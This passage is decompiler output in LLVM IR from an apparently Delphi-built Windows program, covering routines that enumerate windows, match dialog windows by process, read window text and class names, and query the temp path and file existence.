  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1796
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1797
  br label %dec_label_pc_407165, !insn.addr !1797

dec_label_pc_407165:                              ; preds = %dec_label_pc_407130, %dec_label_pc_4070aa, %dec_label_pc_40707c
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1798
  %62 = load i32, i32* %61, align 4, !insn.addr !1798
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1799
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1800
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1800
  store i32 4223367, i32* %64, align 4, !insn.addr !1800
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1801
  ret i32 %65, !insn.addr !1802
}

define i32 @function_407180() local_unnamed_addr {
dec_label_pc_407180:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1803
  ret i32 %0, !insn.addr !1803
}

define i32 @function_407185() local_unnamed_addr {
dec_label_pc_407185:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1804
}

define i32 @function_407187(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407187:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1805
}

define i32 @function_4071bc() local_unnamed_addr {
dec_label_pc_4071bc:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036e4(), !insn.addr !1806
  %1 = call i32 @function_4036e4(), !insn.addr !1807
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1808
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1808
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1808
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1809
  %4 = call i32 @function_403cbc(), !insn.addr !1810
  %5 = icmp slt i32 %4, 0, !insn.addr !1811
  br i1 %5, label %dec_label_pc_407244, label %dec_label_pc_407212, !insn.addr !1812

dec_label_pc_407212:                              ; preds = %dec_label_pc_4071bc
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1813
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1814
  br label %dec_label_pc_407290

dec_label_pc_407244:                              ; preds = %dec_label_pc_4071bc
  %8 = call i32 @function_403cb4(), !insn.addr !1815
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1816
  %10 = call i32 @function_403cbc(), !insn.addr !1817
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1818
  %12 = call i32 @function_403cbc(), !insn.addr !1819
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1820
  %14 = call i32 @function_40707c(), !insn.addr !1821
  br label %dec_label_pc_407290, !insn.addr !1821

dec_label_pc_407290:                              ; preds = %dec_label_pc_407212, %dec_label_pc_407244
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1822
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1823
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1824
  ret i32 %16, !insn.addr !1825
}

define i32 @function_4072ab() local_unnamed_addr {
dec_label_pc_4072ab:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1826
  ret i32 %0, !insn.addr !1826
}

define i32 @function_4072b0() local_unnamed_addr {
dec_label_pc_4072b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1827
}

define i32 @function_4072b2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4072b2:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1828
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1828
  %3 = load i32, i32* %2, align 4, !insn.addr !1828
  ret i32 %3, !insn.addr !1829
}

define i32 @function_4072bc() local_unnamed_addr {
dec_label_pc_4072bc:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1830
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1830
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1830
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1831
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1832
  %3 = add i32 %2, 1, !insn.addr !1832
  %4 = icmp eq i32 %3, 0, !insn.addr !1832
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1832
  %5 = icmp eq i1 %4, false, !insn.addr !1833
  br i1 %5, label %dec_label_pc_4072f4, label %dec_label_pc_4072d5, !insn.addr !1833

dec_label_pc_4072d5:                              ; preds = %dec_label_pc_4072bc
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1834
  %7 = icmp eq i32 %6, 0, !insn.addr !1834
  br i1 %7, label %dec_label_pc_4072e4, label %dec_label_pc_4072df, !insn.addr !1835

dec_label_pc_4072df:                              ; preds = %dec_label_pc_4072d5
  %8 = call i32 @function_40707c(), !insn.addr !1836
  br label %dec_label_pc_4072e4, !insn.addr !1836

dec_label_pc_4072e4:                              ; preds = %dec_label_pc_4072df, %dec_label_pc_4072d5
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1837
  br label %dec_label_pc_4072f4, !insn.addr !1837

dec_label_pc_4072f4:                              ; preds = %dec_label_pc_4072e4, %dec_label_pc_4072bc
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1838
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1839
  ret i32 0, !insn.addr !1840
}

define i32 @function_407302() local_unnamed_addr {
dec_label_pc_407302:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1841
  ret i32 %0, !insn.addr !1841
}

define i32 @function_407307() local_unnamed_addr {
dec_label_pc_407307:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1842
}

define i32 @function_407309(i32 %arg1) local_unnamed_addr {
dec_label_pc_407309:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1843
}

define i32 @function_40730c() local_unnamed_addr {
dec_label_pc_40730c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1844
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1844
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1844
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1845
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1846
  %3 = add i32 %2, -1, !insn.addr !1846
  %4 = icmp eq i32 %2, 0, !insn.addr !1846
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1846
  %5 = icmp eq i1 %4, false, !insn.addr !1847
  br i1 %5, label %dec_label_pc_407340, label %dec_label_pc_407326, !insn.addr !1847

dec_label_pc_407326:                              ; preds = %dec_label_pc_40730c
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1848
  br label %dec_label_pc_407340, !insn.addr !1849

dec_label_pc_407340:                              ; preds = %dec_label_pc_407326, %dec_label_pc_40730c
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1850
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1851
  ret i32 0, !insn.addr !1852
}

define i32 @function_40734e() local_unnamed_addr {
dec_label_pc_40734e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1853
  ret i32 %0, !insn.addr !1853
}

define i32 @function_407353() local_unnamed_addr {
dec_label_pc_407353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1854
}

define i32 @function_407355(i32 %arg1) local_unnamed_addr {
dec_label_pc_407355:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1855
}

define i1 @function_407358(i8* %pszPath) local_unnamed_addr {
dec_label_pc_407358:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1856
  ret i1 %0, !insn.addr !1856
}

define i32 @function_407360() local_unnamed_addr {
dec_label_pc_407360:
  %eax.0.reg2mem = alloca i32, !insn.addr !1857
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1858
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1859
  %2 = icmp eq i32 %1, 0, !insn.addr !1860
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1861
  br i1 %2, label %dec_label_pc_407396, label %dec_label_pc_407378, !insn.addr !1861

dec_label_pc_407378:                              ; preds = %dec_label_pc_407360
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1858
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1862
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1862
  %7 = load i8, i8* %6, align 1, !insn.addr !1862
  %8 = icmp eq i8 %7, 92, !insn.addr !1862
  br i1 %8, label %dec_label_pc_407388, label %dec_label_pc_40737f, !insn.addr !1863

dec_label_pc_40737f:                              ; preds = %dec_label_pc_407378
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1864
  store i8 92, i8* %9, align 1, !insn.addr !1864
  %10 = or i32 %3, 1, !insn.addr !1865
  %11 = add i32 %1, %10, !insn.addr !1865
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1865
  store i8 0, i8* %12, align 1, !insn.addr !1865
  br label %dec_label_pc_407388, !insn.addr !1865

dec_label_pc_407388:                              ; preds = %dec_label_pc_40737f, %dec_label_pc_407378
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1866
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1866
  br label %dec_label_pc_407396, !insn.addr !1866

dec_label_pc_407396:                              ; preds = %dec_label_pc_407388, %dec_label_pc_407360
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1867
}

define i32 @function_4073a0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4073a0:
  %esp.0.reg2mem = alloca i32, !insn.addr !1868
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1869
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1870
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1870
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1870
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1871
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1872
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1872
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1873
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1873
  %5 = icmp eq i1 %4, false, !insn.addr !1874
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1875
  br i1 %5, label %dec_label_pc_407457, label %dec_label_pc_4073d7, !insn.addr !1875

dec_label_pc_4073d7:                              ; preds = %dec_label_pc_4073a0
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1876
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1876
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1877
  %8 = icmp eq i32 %7, 32770, !insn.addr !1878
  %9 = icmp eq i1 %8, false, !insn.addr !1879
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1879
  br i1 %9, label %dec_label_pc_407457, label %dec_label_pc_4073e6, !insn.addr !1879

dec_label_pc_4073e6:                              ; preds = %dec_label_pc_4073d7
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1880
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1880
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1881
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1881
  %13 = add i32 %arg1, 4, !insn.addr !1882
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1882
  %15 = load i32, i32* %14, align 4, !insn.addr !1882
  %16 = icmp eq i32 %15, %12, !insn.addr !1882
  %17 = icmp eq i1 %16, false, !insn.addr !1883
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1883
  br i1 %17, label %dec_label_pc_407457, label %dec_label_pc_4073f1, !insn.addr !1883

dec_label_pc_4073f1:                              ; preds = %dec_label_pc_4073e6
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1884
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1884
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1885
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1886
  %21 = load i32, i32* %20, align 4, !insn.addr !1886
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1887
  %23 = icmp eq i32 %21, %22, !insn.addr !1887
  %24 = icmp eq i1 %23, false, !insn.addr !1888
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1888
  br i1 %24, label %dec_label_pc_407457, label %dec_label_pc_407402, !insn.addr !1888

dec_label_pc_407402:                              ; preds = %dec_label_pc_4073f1
  %25 = add i32 %arg1, 8, !insn.addr !1889
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1889
  %27 = load i32, i32* %26, align 4, !insn.addr !1889
  %28 = icmp eq i32 %27, 0, !insn.addr !1889
  br i1 %28, label %dec_label_pc_40742c, label %dec_label_pc_407408, !insn.addr !1890

dec_label_pc_407408:                              ; preds = %dec_label_pc_407402
  %29 = call i32 @function_407578(), !insn.addr !1891
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1892
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1893
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_407457

dec_label_pc_40742c:                              ; preds = %dec_label_pc_407402
  %32 = add i32 %arg1, 12, !insn.addr !1894
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1894
  %34 = load i32, i32* %33, align 4, !insn.addr !1894
  %35 = add i32 %arg1, 16, !insn.addr !1895
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1895
  %37 = load i32, i32* %36, align 4, !insn.addr !1895
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1896
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1896
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1896
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1896
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1896
  %43 = add i32 %arg1, 24, !insn.addr !1897
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1897
  store i32 %42, i32* %44, align 4, !insn.addr !1897
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1898
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1898
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1899
  %47 = icmp eq i1 %46, false, !insn.addr !1900
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1901
  br i1 %47, label %dec_label_pc_407457, label %dec_label_pc_407452, !insn.addr !1901

dec_label_pc_407452:                              ; preds = %dec_label_pc_40742c
  %48 = add i32 %arg1, 20, !insn.addr !1902
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1902
  store i32 %arg2, i32* %49, align 4, !insn.addr !1902
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1903
  br label %dec_label_pc_407457, !insn.addr !1903

dec_label_pc_407457:                              ; preds = %dec_label_pc_407408, %dec_label_pc_407452, %dec_label_pc_40742c, %dec_label_pc_4073f1, %dec_label_pc_4073e6, %dec_label_pc_4073d7, %dec_label_pc_4073a0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1904
  %51 = load i32, i32* %50, align 4, !insn.addr !1904
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1905
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1906
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1906
  store i32 4224121, i32* %53, align 4, !insn.addr !1906
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1907
  ret i32 %54, !insn.addr !1908
}

define i32 @function_407472() local_unnamed_addr {
dec_label_pc_407472:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1909
  ret i32 %0, !insn.addr !1909
}

define i32 @function_407477() local_unnamed_addr {
dec_label_pc_407477:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1910
}

define i32 @function_407479(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407479:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1911
}

define i32 @function_407484(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407484:
  %esp.0.reg2mem = alloca i32, !insn.addr !1912
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1913
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1914
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1914
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1914
  %6 = call i32 @function_404448(), !insn.addr !1915
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1916
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1917
  br label %dec_label_pc_4074c8, !insn.addr !1917

dec_label_pc_4074c8:                              ; preds = %dec_label_pc_4074e7, %dec_label_pc_407484
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1916
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1916
  store i32 %7, i32* %9, align 4, !insn.addr !1916
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1918
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1918
  store i32 4223904, i32* %11, align 4, !insn.addr !1918
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1919
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1920
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1920
  store i32 1, i32* %14, align 4, !insn.addr !1920
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1921
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1922
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1922
  store i32 0, i32* %16, align 4, !insn.addr !1922
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1923
  %18 = icmp eq i1 %17, false, !insn.addr !1924
  %19 = icmp eq i1 %18, false, !insn.addr !1925
  br i1 %19, label %dec_label_pc_4074f2, label %dec_label_pc_4074e7, !insn.addr !1925

dec_label_pc_4074e7:                              ; preds = %dec_label_pc_4074c8
  %20 = call i32 @function_404448(), !insn.addr !1926
  %21 = sub i32 %20, %6, !insn.addr !1927
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1928
  %23 = icmp eq i1 %22, false, !insn.addr !1929
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1929
  br i1 %23, label %dec_label_pc_4074c8, label %dec_label_pc_4074f2, !insn.addr !1929

dec_label_pc_4074f2:                              ; preds = %dec_label_pc_4074e7, %dec_label_pc_4074c8
  ret i32 0, !insn.addr !1930
}

define i32 @function_40750c() local_unnamed_addr {
dec_label_pc_40750c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1931
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1932
}

define i32 @function_407524(i32 %arg1) local_unnamed_addr {
dec_label_pc_407524:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1933
  %edi.0.reg2mem = alloca i32, !insn.addr !1933
  %ecx.0.reg2mem = alloca i32, !insn.addr !1933
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1934
  br label %2, !insn.addr !1934

; <label>:2:                                      ; preds = %4, %dec_label_pc_407524
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1934
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1934
  br i1 %3, label %10, label %4, !insn.addr !1934

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1934
  %6 = load i8, i8* %5, align 1, !insn.addr !1934
  %7 = icmp eq i8 %6, 0, !insn.addr !1934
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1934
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1934
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1934
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1934
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1934
  br i1 %7, label %10, label %2, !insn.addr !1934

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1935
  ret i32 %11, !insn.addr !1936
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_407578() local_unnamed_addr {
dec_label_pc_407578:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1937
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1938
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1938
  %4 = add i32 %3, %1, !insn.addr !1939
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1939
  store i8 0, i8* %5, align 1, !insn.addr !1939
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1940
  ret i32 %6, !insn.addr !1941
}

define i32 @function_4075ac() local_unnamed_addr {
dec_label_pc_4075ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1942
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1943
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1944
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1944
  %6 = add i32 %5, %3, !insn.addr !1945
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1945
  store i8 0, i8* %7, align 1, !insn.addr !1945
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1946
  ret i32 %8, !insn.addr !1947
}

define i32 @function_4075e4() local_unnamed_addr {
dec_label_pc_4075e4:
  %0 = call i32 @function_4034f4(), !insn.addr !1948
  %1 = call i32 @function_4034f4(), !insn.addr !1949
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1950
  ret i32 %2, !insn.addr !1951
}

define i32 @function_407624() local_unnamed_addr {
dec_label_pc_407624:
  %0 = call i32 @function_4034f4(), !insn.addr !1952
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1953
  ret i32 %1, !insn.addr !1954
}

define i32 @function_40765c() local_unnamed_addr {
dec_label_pc_40765c:
  %0 = call i32 @function_4036f4(), !insn.addr !1955
  %1 = call i32 @function_4036f4(), !insn.addr !1956
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1957
  %3 = icmp eq i32 %2, 2, !insn.addr !1958
  %4 = zext i1 %3 to i32, !insn.addr !1959
  %5 = and i32 %2, -256, !insn.addr !1959
  %6 = or i32 %5, %4, !insn.addr !1959
  ret i32 %6, !insn.addr !1960
}

define i32 @function_40768c() local_unnamed_addr {
dec_label_pc_40768c:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1961
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1961
  %esp.02.reg2mem = alloca i32, !insn.addr !1961
  %storemerge3.reg2mem = alloca i32, !insn.addr !1961
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1962
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1962
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1962
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1963
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1964
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1965
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1965
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1966
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1966
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1966
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1967
  %9 = icmp eq i1 %8, false, !insn.addr !1968
  %10 = icmp eq i1 %9, false, !insn.addr !1969
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1969
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1969
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1969
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1969
  br i1 %10, label %dec_label_pc_4076b0, label %dec_label_pc_4076f0, !insn.addr !1969

dec_label_pc_4076b0:                              ; preds = %dec_label_pc_40768c, %dec_label_pc_4076b0
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_407578(), !insn.addr !1970
  %12 = call i32 @function_40768c(), !insn.addr !1971
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1972
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1972
  store i32 2, i32* %14, align 4, !insn.addr !1972
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1973
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1973
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1973
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1974
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1966
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1966
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1967
  %21 = icmp eq i1 %20, false, !insn.addr !1968
  %22 = icmp eq i1 %21, false, !insn.addr !1969
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1969
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1969
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1969
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1969
  br i1 %22, label %dec_label_pc_4076b0, label %dec_label_pc_4076f0, !insn.addr !1969

dec_label_pc_4076f0:                              ; preds = %dec_label_pc_4076b0, %dec_label_pc_40768c
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1975
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1976
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1977
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1977
  store i32 4224781, i32* %25, align 4, !insn.addr !1977
  %26 = call i32 @"@LStrClr"(), !insn.addr !1978
  ret i32 %26, !insn.addr !1979
}

define i32 @function_407706() local_unnamed_addr {
dec_label_pc_407706:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1980
  ret i32 %0, !insn.addr !1980
}

define i32 @function_40770b() local_unnamed_addr {
dec_label_pc_40770b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1981
}

define i32 @function_40770d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40770d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1982
}

define i32 @function_407718() local_unnamed_addr {
dec_label_pc_407718:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1983
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1983
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1983
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1984
  %2 = call i32 @function_4075ac(), !insn.addr !1985
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1986
  %4 = call i32 @function_40768c(), !insn.addr !1987
